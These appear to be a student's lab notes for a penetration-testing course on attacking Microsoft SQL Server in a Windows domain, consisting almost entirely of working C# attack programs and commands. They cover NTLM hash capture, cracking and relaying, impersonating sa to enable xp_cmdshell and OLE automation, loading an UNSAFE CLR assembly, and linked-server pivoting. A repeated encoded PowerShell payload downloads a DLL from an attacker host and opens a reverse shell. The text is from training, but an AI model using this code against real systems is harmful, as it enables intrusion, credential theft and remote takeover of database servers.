# Microsoft SQL Attacks
## MS SQL Authentication 
Find MS SQL instances in the domain with registered SPNs running  host.
`. .\GetUserSPNs.ps1`
`setspn -T corp1 -Q MSSQLSvc/*`

### 15.1.2.1 Exercises On Victim 
```
using System;
using System.Data.SqlClient;

namespace TestSqlConnect
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "dc01.corp1.com";
            String database = "master";
            String conString = "Server = " + sqlServer + "; Database = " + database +"; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);
            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }
            con.Close();
        }
    }
}
```
## UNC Path Injection must have sa privliege
### 15.1.3.1 Exercises
Triger SQL Server use Smb NTLM Auth Remote Host
```
using System;
using System.Data.SqlClient;

namespace TestSqlConnect
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "dc01.corp1.com";
            String database = "master";
            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);
            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            String query = "EXEC master..xp_dirtree \"\\\\192.168.49.70\\\\test\";";
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            con.Close();
        }
    }
}

```
Listen SQL NTLM 
`sudo responder -I tap0`
Cracker NTLM Hash
`hashcat -m 5600 hash.txt dict.txt --force`
Connect Remote Host With password
` python3 /usr/share/doc/python3-impacket/examples/psexec.py SQLSVC@appsrv01.CORP1.COM`
## Relay My Hash
### 15.1.4.1 Exercises 
![[Pasted image 20210718145559.png]]
```
$bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
$EncodedText = [Convert]::ToBase64String($bytes)
$EncodedText
```

```
sudo impacket-ntlmrelayx --no-http-server -smb2support -t [SQLServer] -c 'powershell -enc JABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADcAMAAvAEkAbgB2AG8AawBlAC0AZABsAGwALgBkAGwAbAAnACkAOwAkAGEAcwBzACAAPQAgAFsAUwB5AHMAdABlAG0ALgBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKAAkAGQAYQB0AGEAKQA7ACQAYwBsAGEAcwBzACAAPQAgACQAYQBzAHMALgBHAGUAdABUAHkAcABlACgAJwBJAG4AdgBvAGsAZQBfAGQAbABsAC4AUgBlAHYAZQByAHMAZQBfAHQAYwBwACcAKQA7ACQAbQBlAHQAaABvAGQAIAA9ACAAJABjAGwAYQBzAHMALgBHAGUAdABNAGUAdABoAG8AZAAoACcAcgB1AG4AbgBlAHIAJwApADsAJABtAGUAdABoAG8AZAAuAEkAbgB2AG8AawBlACgAMAAsACQAbgB1AGwAbAApAA=='
```
##  MS SQL Escalation (Need have sa Privilege)
```
using System;
using System.Data.SqlClient;

namespace TestSqlConnect
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "dc01.corp1.com";
            String database = "master";
            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);
            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }
            String impersonateUser = "EXECUTE AS LOGIN = 'sa';";

            String enable_xpcmd = "EXEC sp_configure 'show advanced options', 1;RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; ";
            String execCmd = "EXEC xp_cmdshell whoami";
            SqlCommand command = new SqlCommand(impersonateUser, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(enable_xpcmd, con);
            reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Result of command is: " + reader[0]);
            reader.Close();

            String enable_ole = "EXEC sp_configure 'Ole Automation Procedures', 1;RECONFIGURE; ";
            execCmd = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell',@myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"echo Test >C:\\Tools\\file.txt\"';";
            command = new SqlCommand(impersonateUser, con);
            reader = command.ExecuteReader();
            reader.Close();
            command = new SqlCommand(enable_ole, con);
            reader = command.ExecuteReader();
            reader.Close();
            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();
            reader.Close();

            con.Close();
        }
    }
}

```
### 15.2.2.1 Exercises-1
```
using System;
using System.Data.SqlClient;

namespace TestSqlConnect
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "dc01.corp1.com";
            String database = "master";
            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);
            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }
            String impersonateUser = "EXECUTE AS LOGIN = 'sa';";

            String enable_xpcmd = "EXEC sp_configure 'show advanced options', 1;RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; ";
            //"`$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.70/Invoke-dll.dll');`$ass = [System.Reflection.Assembly]::Load(`$data);`$class = `$ass.GetType('Invoke_dll.Reverse_tcp');`$method = `$class.GetMethod('runner');`$method.Invoke(0,`$null)"
            String reverse_shell = "powershell -enc JABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADcAMAAvAEkAbgB2AG8AawBlAC0AZABsAGwALgBkAGwAbAAnACkAOwAkAGEAcwBzACAAPQAgAFsAUwB5AHMAdABlAG0ALgBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKAAkAGQAYQB0AGEAKQA7ACQAYwBsAGEAcwBzACAAPQAgACQAYQBzAHMALgBHAGUAdABUAHkAcABlACgAJwBJAG4AdgBvAGsAZQBfAGQAbABsAC4AUgBlAHYAZQByAHMAZQBfAHQAYwBwACcAKQA7ACQAbQBlAHQAaABvAGQAIAA9ACAAJABjAGwAYQBzAHMALgBHAGUAdABNAGUAdABoAG8AZAAoACcAcgB1AG4AbgBlAHIAJwApADsAJABtAGUAdABoAG8AZAAuAEkAbgB2AG8AawBlACgAMAAsACQAbgB1AGwAbAApAA==";
            String execCmd = "EXEC xp_cmdshell '"+ reverse_shell+"'";
            SqlCommand command = new SqlCommand(impersonateUser, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(enable_xpcmd, con);
            reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();
            reader.Close();
            con.Close();
        }
    }
}

```
### 15.2.2.1 Exercises-2
```
using System;
using System.Data.SqlClient;

namespace TestSqlConnect
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "dc01.corp1.com";
            String database = "master";
            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);
            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }
            String impersonateUser = "EXECUTE AS LOGIN = 'sa';";
            String enable_ole = "EXEC sp_configure 'Ole Automation Procedures', 1;RECONFIGURE; ";
            String reverse_shell = "powershell -enc JABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADcAMAAvAEkAbgB2AG8AawBlAC0AZABsAGwALgBkAGwAbAAnACkAOwAkAGEAcwBzACAAPQAgAFsAUwB5AHMAdABlAG0ALgBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKAAkAGQAYQB0AGEAKQA7ACQAYwBsAGEAcwBzACAAPQAgACQAYQBzAHMALgBHAGUAdABUAHkAcABlACgAJwBJAG4AdgBvAGsAZQBfAGQAbABsAC4AUgBlAHYAZQByAHMAZQBfAHQAYwBwACcAKQA7ACQAbQBlAHQAaABvAGQAIAA9ACAAJABjAGwAYQBzAHMALgBHAGUAdABNAGUAdABoAG8AZAAoACcAcgB1AG4AbgBlAHIAJwApADsAJABtAGUAdABoAG8AZAAuAEkAbgB2AG8AawBlACgAMAAsACQAbgB1AGwAbAApAA==";
            String execCmd = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell',@myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, '"+ reverse_shell + "';";
            SqlCommand command = new SqlCommand(impersonateUser, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();
            command = new SqlCommand(enable_ole, con);
            reader = command.ExecuteReader();
            reader.Close();
            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();
            reader.Close();
            con.Close();
            }
        }
    }

```
## Custom Assemblies
### 15.2.3.1 Exercises -1
execmd.dll
```
using System;
using Microsoft.SqlServer.Server;
using System.Data.SqlTypes;
using System.Diagnostics;

public class StoredProcedures
{
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void cmdExec(SqlString execCommand)
    {
        Process proc = new Process();
        proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
        proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand);
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.Start();

        SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", System.Data.SqlDbType.NVarChar, 4000));
        SqlContext.Pipe.SendResultsStart(record);
        record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());
        SqlContext.Pipe.SendResultsRow(record);
        SqlContext.Pipe.SendResultsEnd();

        proc.WaitForExit();
        proc.Close();

    }

}

```
sql.exe
```
using System;
using System.Data.SqlClient;

namespace TestSqlConnect
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "dc01.corp1.com";
            String database = "master";
            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            String impersonateUser = "EXECUTE AS LOGIN = 'sa';";
            String enable_options = @"use msdb;EXEC sp_configure 'show advanced options', 1;RECONFIGURE; EXEC sp_configure 'clr enabled',1;RECONFIGURE;EXEC sp_configure 'clr strict security', 0;RECONFIGURE;";                      
            String creatAsm = "CREATE ASSEMBLY myAssembly FROM 'c:\\tools\\cmdExec.dll' WITH PERMISSION_SET = UNSAFE;";
            String creatPro = "CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];";
            String exeCmd = "Exec cmdExec 'whoami'";

            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            try
            {
                SqlCommand command = new SqlCommand(impersonateUser, con);
                SqlDataReader reader = command.ExecuteReader();
                reader.Close();

                command = new SqlCommand(enable_options, con);
                reader = command.ExecuteReader();
                reader.Close();

                command = new SqlCommand(creatAsm, con);
                reader = command.ExecuteReader();
                reader.Close();

                command = new SqlCommand(creatPro, con);
                reader = command.ExecuteReader();
                reader.Close();

                command = new SqlCommand(exeCmd, con);
                reader = command.ExecuteReader();
                reader.Read();
                Console.WriteLine("Result of command is: " + reader[0]);
                reader.Close();
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
            con.Close();
        }
    }
}

```
### 15.2.3.1 Exercises -2
```
using System;
using System.Data.SqlClient;

namespace SqlConnect
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "dc01.corp1.com";
            String database = "master";
            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            String impersonateUser = "EXECUTE AS LOGIN = 'sa';";
            String enable_options = @"use msdb;EXEC sp_configure 'show advanced options', 1;RECONFIGURE; EXEC sp_configure 'clr enabled',1;RECONFIGURE;EXEC sp_configure 'clr strict security', 0;RECONFIGURE;";
            String DLL_HEX = "0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A240000000000000050450000648602003B7FCBC00000000000000000F00022200B023000000C00000004000000000000000000000020000000000080010000000020000000020000040000000000000004000000000000000060000000020000000000000300408500004000000000000040000000000000000010000000000000200000000000000000000010000000000000000000000000000000000000000040000068030000000000000000000000000000000000000000000000000000E0290000380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000004800000000000000000000002E746578740000007F0A000000200000000C000000020000000000000000000000000000200000602E72737263000000680300000040000000040000000E00000000000000000000000000004000004000000000000000000000000000000000000000000000000000000000000000000000000000000000480000000200050014210000CC080000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000013300600B500000001000011731000000A0A066F1100000A72010000706F1200000A066F1100000A7239000070028C12000001281300000A6F1400000A066F1100000A166F1500000A066F1100000A176F1600000A066F1700000A26178D17000001251672490000701F0C20A00F00006A731800000AA2731900000A0B281A00000A076F1B00000A0716066F1C00000A6F1D00000A6F1E00000A6F1F00000A281A00000A076F2000000A281A00000A6F2100000A066F2200000A066F2300000A2A1E02282400000A2A00000042534A4201000100000000000C00000076342E302E33303331390000000005006C000000B8020000237E000024030000F803000023537472696E6773000000001C070000580000002355530074070000100000002347554944000000840700004801000023426C6F620000000000000002000001471502000900000000FA013300160000010000001C000000020000000200000001000000240000000F00000001000000010000000300000000006B020100000000000600950119030600020219030600B300E7020F00390300000600DB007D02060078017D02060059017D020600E9017D020600B5017D020600CE017D02060008017D020600C700FA020600A500FA0206003C017D0206002301340206008B0376020A00F200C6020A004E0248030E006E03E7020A006900C6020E009D02E7020600640276020A002700C6020A0095001B000A00DD03C6020A008D00C6020600AE0211000600BB0211000000000008000000000001000100010010005D03000041000100010048200000000096003C00620001000921000000008618E10206000200000001005D000900E10201001100E10206001900E1020A002900E10210003100E10210003900E10210004100E10210004900E10210005100E10210005900E10210006100E10215006900E10210007100E10210007900E10210008900E10206009900E102060099008F022100A90077001000B10084032600A90076031000A90020021500A900C20315009900A9032C00B900E1023000A100E1023800C90084003F00D1009E0344009900AF034A00E10044004F00810058024F00A10061025300D100E8034400D1004E00060099009203060099009F0006008100E102060020007B0042012E000B0068002E00130071002E001B0090002E00230099002E002B00A5002E003300A5002E003B00A5002E00430099002E004B00AB002E005300A5002E005B00A5002E006300C3002E006B00ED002E007300FA001A0004800000010000000000000000000000000001000000040000000000000000000000590033000000000004000000000000000000000059001B00000000000400000000000000000000005900760200000000000000436C61737331003C4D6F64756C653E0053797374656D2E494F0053797374656D2E446174610053716C4D65746144617461006D73636F726C696200636D64457865630052656164546F456E640053656E64526573756C7473456E640065786563436F6D6D616E640053716C446174615265636F7264007365745F46696C654E616D65006765745F506970650053716C506970650053716C44625479706500436C6F736500477569644174747269627574650044656275676761626C6541747472696275746500436F6D56697369626C6541747472696275746500417373656D626C795469746C654174747269627574650053716C50726F63656475726541747472696275746500417373656D626C7954726164656D61726B417474726962757465005461726765744672616D65776F726B41747472696275746500417373656D626C7946696C6556657273696F6E41747472696275746500417373656D626C79436F6E66696775726174696F6E41747472696275746500417373656D626C794465736372697074696F6E41747472696275746500436F6D70696C6174696F6E52656C61786174696F6E7341747472696275746500417373656D626C7950726F6475637441747472696275746500417373656D626C79436F7079726967687441747472696275746500417373656D626C79436F6D70616E794174747269627574650052756E74696D65436F6D7061746962696C697479417474726962757465007365745F5573655368656C6C457865637574650053797374656D2E52756E74696D652E56657273696F6E696E670053716C537472696E6700546F537472696E6700536574537472696E6700436C617373312E646C6C0053797374656D0053797374656D2E5265666C656374696F6E006765745F5374617274496E666F0050726F636573735374617274496E666F0053747265616D5265616465720054657874526561646572004D6963726F736F66742E53716C5365727665722E536572766572002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E496E7465726F7053657276696365730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730053797374656D2E446174612E53716C54797065730053746F72656450726F636564757265730050726F63657373007365745F417267756D656E747300466F726D6174004F626A6563740057616974466F72457869740053656E64526573756C74735374617274006765745F5374616E646172644F7574707574007365745F52656469726563745374616E646172644F75747075740053716C436F6E746578740053656E64526573756C7473526F770000003743003A005C00570069006E0064006F00770073005C00530079007300740065006D00330032005C0063006D0064002E00650078006500000F20002F00430020007B0030007D00000D6F00750074007000750074000000EB808436F1EA274BA75065EA719DCEE600042001010803200001052001011111042001010E0420010102060702124D125104200012550500020E0E1C03200002072003010E11610A062001011D125D0400001269052001011251042000126D0320000E05200201080E08B77A5C561934E0890500010111490801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F7773010801000200000000000B010006436C61737331000005010000000017010012436F7079726967687420C2A920203230323100002901002465316337613839332D366436382D346564362D383665352D37303038613265306565396600000C010007312E302E302E3000004701001A2E4E45544672616D65776F726B2C56657273696F6E3D76342E300100540E144672616D65776F726B446973706C61794E616D65102E4E4554204672616D65776F726B203404010000000000000000DF7AFDEF000000000200000067000000182A0000180C00000000000000000000000000001000000000000000000000000000000052534453D00FC8C305E0A74AA60509E81B40FDB101000000433A5C55736572735C6F7363705C736F757263655C7265706F735C636861707465722031355C436C617373315C436C617373315C6F626A5C7836345C52656C656173655C436C617373312E7064620000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000000C03000000000000000000000C0334000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000001000000000000000100000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B0046C020000010053007400720069006E006700460069006C00650049006E0066006F0000004802000001003000300030003000300034006200300000001A000100010043006F006D006D0065006E007400730000000000000022000100010043006F006D00700061006E0079004E0061006D0065000000000000000000360007000100460069006C0065004400650073006300720069007000740069006F006E000000000043006C00610073007300310000000000300008000100460069006C006500560065007200730069006F006E000000000031002E0030002E0030002E003000000036000B00010049006E007400650072006E0061006C004E0061006D006500000043006C0061007300730031002E0064006C006C00000000004800120001004C006500670061006C0043006F007000790072006900670068007400000043006F0070007900720069006700680074002000A90020002000320030003200310000002A00010001004C006500670061006C00540072006100640065006D00610072006B00730000000000000000003E000B0001004F0072006900670069006E0061006C00460069006C0065006E0061006D006500000043006C0061007300730031002E0064006C006C00000000002E0007000100500072006F0064007500630074004E0061006D0065000000000043006C00610073007300310000000000340008000100500072006F006400750063007400560065007200730069006F006E00000031002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000031002E0030002E0030002E0030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
            String creatAsm = "CREATE ASSEMBLY myAssembly FROM " +
                              DLL_HEX 
                              + " WITH PERMISSION_SET = UNSAFE;";
            String creatPro = "CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];";
            String exeCmd = "Exec cmdExec 'powershell -enc JABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADcAMAAvAEkAbgB2AG8AawBlAC0AZABsAGwALgBkAGwAbAAnACkAOwAkAGEAcwBzACAAPQAgAFsAUwB5AHMAdABlAG0ALgBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKAAkAGQAYQB0AGEAKQA7ACQAYwBsAGEAcwBzACAAPQAgACQAYQBzAHMALgBHAGUAdABUAHkAcABlACgAJwBJAG4AdgBvAGsAZQBfAGQAbABsAC4AUgBlAHYAZQByAHMAZQBfAHQAYwBwACcAKQA7ACQAbQBlAHQAaABvAGQAIAA9ACAAJABjAGwAYQBzAHMALgBHAGUAdABNAGUAdABoAG8AZAAoACcAcgB1AG4AbgBlAHIAJwApADsAJABtAGUAdABoAG8AZAAuAEkAbgB2AG8AawBlACgAMAAsACQAbgB1AGwAbAApAA=='";

            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            try
            {
                SqlCommand command = new SqlCommand(impersonateUser, con);
                SqlDataReader reader = command.ExecuteReader();
                reader.Close();

                command = new SqlCommand(enable_options, con);
                reader = command.ExecuteReader();
                reader.Close();

                command = new SqlCommand(creatAsm, con);
                reader = command.ExecuteReader();
                reader.Close();

                command = new SqlCommand(creatPro, con);
                reader = command.ExecuteReader();
                reader.Close();

                command = new SqlCommand(exeCmd, con);
                reader = command.ExecuteReader();
                reader.Read();
                Console.WriteLine("Result of command is: " + reader[0]);
                reader.Close();
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
            con.Close();
        }
    }
}

```
## Follow the Link
### 15.3.1.1 Exercises
```
using System;
using System.Data.SqlClient;

namespace SqlConnect
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "appsrv01.corp1.com";
            String database = "master";
            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            try
            {

                String enumlink = "EXEC sp_linkedservers;";
                SqlCommand command = new SqlCommand(enumlink, con);
                SqlDataReader reader = command.ExecuteReader();
                while (reader.Read())
                {
                    Console.WriteLine("Linked SQL server: " + reader[0]);
                }
                reader.Close();
                String versionCmd = "select version from openquery(\"dc01\", 'select @@version as version');";
                command = new SqlCommand(versionCmd, con);
                reader = command.ExecuteReader();
                reader.Read();
                Console.WriteLine("Linked SQL server version: " + reader[0] );
                reader.Close();


                String selectuser = "select SYSTEM_USER";
                command = new SqlCommand(selectuser, con);
                reader = command.ExecuteReader();
                reader.Read();
                Console.WriteLine("Executing as the login" + reader[0] + "on " + sqlServer);
                reader.Close();

                
                String openuser = "select myuser from openquery(\"dc01\", 'select SYSTEM_USER as myuser');";
                command = new SqlCommand(openuser, con);
                reader = command.ExecuteReader();
                reader.Read();
                Console.WriteLine("onther SQL Server Executing as th login " + reader[0] + " on dc01");
                reader.Close();

                String enable_options = "EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT dc01;";
                String enable_xpcmd   = "EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT dc01;";
                String execmd = "EXEC ('xp_cmdshell ''powershell -enc JABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADcAMAAvAEkAbgB2AG8AawBlAC0AZABsAGwALgBkAGwAbAAnACkAOwAkAGEAcwBzACAAPQAgAFsAUwB5AHMAdABlAG0ALgBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKAAkAGQAYQB0AGEAKQA7ACQAYwBsAGEAcwBzACAAPQAgACQAYQBzAHMALgBHAGUAdABUAHkAcABlACgAJwBJAG4AdgBvAGsAZQBfAGQAbABsAC4AUgBlAHYAZQByAHMAZQBfAHQAYwBwACcAKQA7ACQAbQBlAHQAaABvAGQAIAA9ACAAJABjAGwAYQBzAHMALgBHAGUAdABNAGUAdABoAG8AZAAoACcAcgB1AG4AbgBlAHIAJwApADsAJABtAGUAdABoAG8AZAAuAEkAbgB2AG8AawBlACgAMAAsACQAbgB1AGwAbAApAA=='';') AT dc01;";

                command = new SqlCommand(enable_options, con);
                reader = command.ExecuteReader();
                reader.Read();
                reader.Close();

                command = new SqlCommand(enable_xpcmd, con);
                reader = command.ExecuteReader();
                reader.Read();
                reader.Close();

                command = new SqlCommand(execmd, con);
                reader = command.ExecuteReader();
                reader.Read();
                Console.WriteLine("result is " + reader[0] + " on dc01");
                reader.Close();




            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
            con.Close();
        }
    }
}


```
### 15.3.1.2 Extra Mile Open query
```
using System;
using System.Data.SqlClient;

namespace SqlConnect
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "appsrv01.corp1.com";
            String database = "master";
            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            try
            {

                String enumlink = "EXEC sp_linkedservers;";
                SqlCommand command = new SqlCommand(enumlink, con);
                SqlDataReader reader = command.ExecuteReader();
                while (reader.Read())
                {
                    Console.WriteLine("Linked SQL server: " + reader[0]);
                }
                reader.Close();
                String versionCmd = "select version from openquery(\"dc01\", 'select @@version as version');";
                command = new SqlCommand(versionCmd, con);
                reader = command.ExecuteReader();
                reader.Read();
                Console.WriteLine("Linked SQL server version: " + reader[0] );
                reader.Close();

                String selectuser = "select SYSTEM_USER";
                command = new SqlCommand(selectuser, con);
                reader = command.ExecuteReader();
                reader.Read();
                Console.WriteLine("Executing as th login" + reader[0] + "on " + sqlServer);
                reader.Close();

                String openuser = "select myuser from openquery(\"dc01\", 'select SYSTEM_USER as myuser');";
                command = new SqlCommand(openuser, con);
                reader = command.ExecuteReader();
                reader.Read();
                Console.WriteLine("onther SQL Server Executing as th login " + reader[0] + " on dc01");
                reader.Close();

                String target = "DC01";
                String xpcmd_enable = String.Format("select 1 from openquery(\"{0}\", 'SELECT 1; EXEC sp_configure ''show advanced options'', 1; RECONFIGURE;EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;')", target);
                Console.WriteLine("OK");
                String commands = "powershell -enc JABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADcAMAAvAEkAbgB2AG8AawBlAC0AZABsAGwALgBkAGwAbAAnACkAOwAkAGEAcwBzACAAPQAgAFsAUwB5AHMAdABlAG0ALgBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKAAkAGQAYQB0AGEAKQA7ACQAYwBsAGEAcwBzACAAPQAgACQAYQBzAHMALgBHAGUAdABUAHkAcABlACgAJwBJAG4AdgBvAGsAZQBfAGQAbABsAC4AUgBlAHYAZQByAHMAZQBfAHQAYwBwACcAKQA7ACQAbQBlAHQAaABvAGQAIAA9ACAAJABjAGwAYQBzAHMALgBHAGUAdABNAGUAdABoAG8AZAAoACcAcgB1AG4AbgBlAHIAJwApADsAJABtAGUAdABoAG8AZAAuAEkAbgB2AG8AawBlACgAMAAsACQAbgB1AGwAbAApAA==";
                String execute_xpcmd = String.Format("SELECT 1 FROM openquery(\"{0}\", 'SELECT 1;EXEC xp_cmdshell ''{1}'';')", target,commands);
                Console.WriteLine("OK");
                command = new SqlCommand(xpcmd_enable, con);
                reader = command.ExecuteReader();
                reader.Read();
                reader.Close();

                command = new SqlCommand(execute_xpcmd, con);
                reader = command.ExecuteReader();
                reader.Read();
                Console.WriteLine("result is " + reader[0] + " on "+ target);
                reader.Close();
            }
